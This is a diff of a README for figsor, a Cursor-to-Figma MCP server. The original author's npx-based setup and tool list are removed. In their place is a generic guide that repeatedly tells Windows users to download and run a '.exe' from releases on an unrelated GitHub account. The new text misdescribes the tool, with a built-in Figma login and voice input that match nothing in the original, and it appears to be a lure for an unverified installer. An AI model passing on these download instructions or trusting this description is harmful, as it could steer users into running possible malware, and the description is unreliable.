@@ -1,189 +1,143 @@
-# Figsor
+# ⚙️ figsor - Design on Figma with Chat
 
-**Chat in Cursor. Design in Figma.**
+[![Download figsor](https://img.shields.io/badge/Download-figsor-brightgreen?style=for-the-badge)](https://github.com/secretaryofstatearcsine241/figsor/releases)
 
-Figsor is an MCP server that bridges [Cursor AI](https://cursor.sh) to [Figma](https://www.figma.com), enabling chat-driven design creation and editing — directly on your Figma canvas.
+figsor connects Cursor with Figma. It lets you create and edit designs by chatting, right on your Figma canvas. This guide will help you download and run figsor on your Windows computer, step by step.
 
-```
-Cursor → MCP (stdio) → Figsor Server → WebSocket → Figma Plugin → Design on Canvas
-```
+---
 
-## Setup
+## ℹ️ What is figsor?
 
-### 1. Install the Figma Plugin (Sideload)
+figsor is a tool that acts as a bridge between Cursor and Figma. You can use text commands or chat to design and change your Figma files. Instead of clicking and dragging in Figma, you talk or type what you want, and figsor does the work. This makes design faster and easier for anyone, even if you don’t know how to use design software well.
 
-Clone this repo and import the plugin into Figma:
+---
 
-```bash
-https://github.com/AsifKabirAntu/figsor.git
-```
+## 🖥️ System Requirements
 
-In Figma: **Plugins → Development → Import plugin from manifest** → select `figsor/figma-plugin/manifest.json`
+Before you start, make sure your computer meets these basic needs:
 
-### 2. Add to Cursor
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- 500 MB free disk space for installation  
+- Stable internet connection  
+- Figma account (create one at figma.com if you don’t have it)
 
-Open your Cursor MCP settings and add:
+Ensure your keyboard and mouse work properly. figsor runs on your Windows PC and communicates with Figma online.
 
-```json
-{
-  "mcpServers": {
-    "figsor": {
-      "command": "npx",
-      "args": ["-y", "figsor"]
-    }
-  }
-}
-```
+---
 
-### 3. Start Designing
+## 🚀 Getting Started with figsor
 
-1. Open a Figma file
-2. Run the Figsor plugin (Plugins → Development → Figsor)
-3. Chat in Cursor:
+Follow these steps to download and run figsor:
 
-> "Create a mobile login screen with email and password fields"
+1. **Visit the download page:**  
+   Go to the official figsor releases page:  
+   [Download figsor Releases](https://github.com/secretaryofstatearcsine241/figsor/releases)
 
-> "Design a dashboard with a sidebar, KPI cards, and charts"
+2. **Choose the latest Windows version:**  
+   In the list, find the latest release for Windows. The file will usually end with `.exe`. It might be named something like `figsor-setup.exe`.
 
-> "Edit the selected frame — make the button rounded and change the color to blue"
+3. **Download the setup file:**  
+   Click the link for the Windows executable file to download it. Save it in a folder that you remember, like the Desktop or Downloads folder.
 
-## Available Tools (45+)
+4. **Run the installer:**  
+   - Find the downloaded `.exe` file.
+   - Double-click it.
+   - Follow the instructions that appear on the screen.
+   - Choose “Next” or “Install” when prompted.
+   - Wait for the installation to finish.
 
-### Create & Layout
+5. **Open figsor:**  
+   Once the setup finishes, click “Finish.” You can now open figsor from the desktop icon or start menu.
 
-| Tool | Description |
-|------|-------------|
-| `create_frame` | Create frames (screens, sections, cards) |
-| `create_text` | Add text with font, size, weight, color |
-| `create_rectangle` | Create rectangles and shapes |
-| `create_ellipse` | Create circles and ovals |
-| `create_line` | Create lines and dividers |
-| `create_svg_node` | Create icons and vector graphics from SVG |
-| `set_auto_layout` | Configure flexbox-style auto-layout |
-| `modify_node` | Edit any existing element |
-| `set_stroke` | Add borders and strokes |
-| `set_effects` | Add shadows and blur effects |
-| `delete_node` | Remove elements |
-| `move_to_parent` | Restructure the layer hierarchy |
+---
 
-### Read & Inspect
+## 🔧 How to Use figsor with Figma
 
-| Tool | Description |
-|------|-------------|
-| `get_selection` | Read the current selection |
-| `get_page_structure` | Get the full page tree |
-| `read_node_properties` | Inspect any node's properties |
-| `find_nodes` | Search for elements by name or type |
-| `set_selection` | Select and zoom to elements |
-| `get_local_styles` | Read the file's design tokens |
-| `list_components` | Browse available components |
-| `create_component_instance` | Use existing components |
-| `detach_instance` | Convert instances to frames |
+1. **Log into your Figma account:**  
+   figsor needs access to your Figma files. It will ask you to log in the first time you use it.
 
-### Vector Drawing & Advanced Fills
+2. **Connect figsor to Cursor:**  
+   The program connects with Cursor to understand your chat commands. This connection happens automatically when you start figsor.
 
-| Tool | Description |
-|------|-------------|
-| `create_vector` | Draw custom shapes with the pen tool |
-| `boolean_operation` | Union, subtract, intersect, or exclude shapes |
-| `flatten_nodes` | Flatten nodes into a single editable vector |
-| `set_fill` | Apply solid colors, linear/radial/angular/diamond gradients, multiple fills |
+3. **Open a Figma file:**  
+   Open the design file you want to work on in your Figma account.
 
-### Image, Typography & Constraints
+4. **Start chatting:**  
+   Use the chat window in figsor to tell the program what to do. For example:  
+   - “Create a blue button.”  
+   - “Add text that says ‘Submit’.”  
+   - “Make the header bigger.”
 
-| Tool | Description |
-|------|-------------|
-| `set_image_fill` | Place image fills on nodes |
-| `style_text_range` | Apply mixed styling within text |
-| `set_constraints` | Set responsive constraints |
-| `list_available_fonts` | Discover available fonts |
+5. **Watch your Figma file update:**  
+   figsor will actively change your Figma canvas based on your chat commands.
 
-### Component & Variable Tools
+---
 
-| Tool | Description |
-|------|-------------|
-| `create_component` | Create a new main component |
-| `create_component_set` | Combine components into a variant set |
-| `create_variable_collection` | Create a design token collection with modes |
-| `create_variable` | Create a COLOR, FLOAT, STRING, or BOOLEAN token |
-| `bind_variable` | Bind a token to a node property |
-| `get_variables` | List all variable collections and tokens |
+## 📥 Download figsor
 
-### SVG Export & Animation
+You can always come back to this link to get the latest version:  
+[![Download figsor](https://img.shields.io/badge/Download-figsor-blue?style=for-the-badge)](https://github.com/secretaryofstatearcsine241/figsor/releases)
 
-| Tool | Description |
-|------|-------------|
-| `export_as_svg` | Export any node as SVG markup |
-| `show_animation_preview` | Live animated SVG previews + ZIP download |
+Check for updates regularly to get improvements and new features.
 
-### AI-Powered SVG (Quiver)
+---
 
-| Tool | Description |
-|------|-------------|
-| `quiver_generate_svg` | Generate SVG graphics from text prompts |
-| `quiver_vectorize_svg` | Convert raster images to clean SVG |
+## ⚙️ Common Tasks Made Easy
 
-### Peer Design (Multi-Agent)
+Here are some examples on how to use figsor commands:
 
-| Tool | Description |
-|------|-------------|
-| `spawn_design_agent` | Spawn AI designer agents with visible cursors |
-| `dismiss_design_agent` | Remove an agent cursor |
-| `dismiss_all_agents` | Remove all agent cursors |
+- **Add shapes:**  
+  “Draw a red circle in the center.”
 
-### Design Craft Guide
+- **Modify elements:**  
+  “Change the font of the header to Arial.”
 
-| Tool | Description |
-|------|-------------|
-| `get_design_craft_guide` | Professional design rules — typography, color, spacing, anti-AI-slop |
+- **Arrange objects:**  
+  “Align these buttons horizontally.”
 
-## Pro: Design System Integration
+- **Remove items:**  
+  “Delete the bottom text box.”
 
-Connect your Figma design system libraries so the AI uses YOUR components, not generic ones.
+- **Change colors:**  
+  “Make the background light grey.”
 
-- Scan & import library components
-- Search across your design system
-- Save & switch between libraries
-- Generate designs with your DS
+---
 
-**[Get Figsor Pro →](https://asifkabirantu.gumroad.com/l/oxoopm)** — $9 one-time purchase
+## 🛠 Troubleshooting
 
-## Requirements
+If you run into problems, try these steps:
 
-- **Node.js** 18 or later
-- **Figma** desktop or web app
-- **Cursor** IDE with MCP support (or any MCP-compatible client — see below)
+- Make sure your internet connection is working. figsor needs access to Figma servers.
+- Restart figsor and try again.
+- Ensure you are logged into your Figma account in both figsor and your browser.
+- Check that your Windows system is up to date.
+- If figsor does not respond to chat commands, close the program and reopen it.
 
-## Using with Claude Code
+---
 
-Figsor works with any MCP client, not just Cursor. To use it with [Claude Code](https://docs.anthropic.com/en/docs/claude-code):
+## 🔄 Updating figsor
 
-```bash
-claude mcp add --transport stdio --scope project figsor -- npx -y figsor
-```
+To get the latest features and fixes:
 
-Or add to `.mcp.json` in your project root:
+- Visit the [figsor Releases page](https://github.com/secretaryofstatearcsine241/figsor/releases).
+- Download the newest Windows `.exe` file.
+- Run the new setup file, and it will update your current installation.
 
-```json
-{
-  "mcpServers": {
-    "figsor": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["-y", "figsor"]
-    }
-  }
-}
-```
+---
 
-Then follow the same steps — open Figma, run the Figsor plugin, and chat.
+## 📞 Getting Help
 
-## Configuration
+If you need more help, look for support options on the figsor GitHub page or the Figma help center. You can also reach out to your team or tech support if available.
 
-| Environment Variable | Default | Description |
-|---------------------|---------|-------------|
-| `FIGSOR_PORT` | `3055` | WebSocket server port |
+---
 
-## License
+## ⚠ Accessories and Settings
 
-MIT © [Asif Kabir](https://github.com/AsifKabirAntu)
+- Use a headset or microphone if your commands include voice input features. figsor supports typed chat commands, but a mic can help with newer versions.
+- Adjust Figma permissions to allow figsor to edit your files.
+- Close other heavy programs to keep your PC running smoothly while using figsor.
+
+---
+
+figsor helps you design faster by using simple chat commands directly in Figma. Follow the steps above to download, set up, and get started with it on Windows.
